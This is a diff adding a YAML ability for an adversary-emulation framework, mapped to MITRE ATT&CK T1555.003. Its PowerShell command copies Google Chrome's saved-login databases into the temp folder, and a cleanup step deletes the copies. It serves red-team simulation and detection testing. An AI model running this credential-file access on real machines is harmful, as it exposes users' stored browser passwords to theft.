@@ -1,0 +1,21 @@
+- description: "Simulates an adversary accessing encrypted credentials from Google\
+    \ Chrome Login database. \n"
+  id: 3267861a1da6d870da272e15b9ab088b
+  name: Simulating access to Chrome Login Data
+  platforms:
+    windows:
+      psh:
+        cleanup: Remove-Item -Path "$env:temp\Login Data" -Force -ErrorAction Ignore;
+          Remove-Item -Path "$env:temp\Login Data For Account" -Force -ErrorAction
+          Ignore
+        command: Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login
+          Data" -Destination $env:temp; Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User
+          Data\Default\Login Data For Account" -Destination $env:temp
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
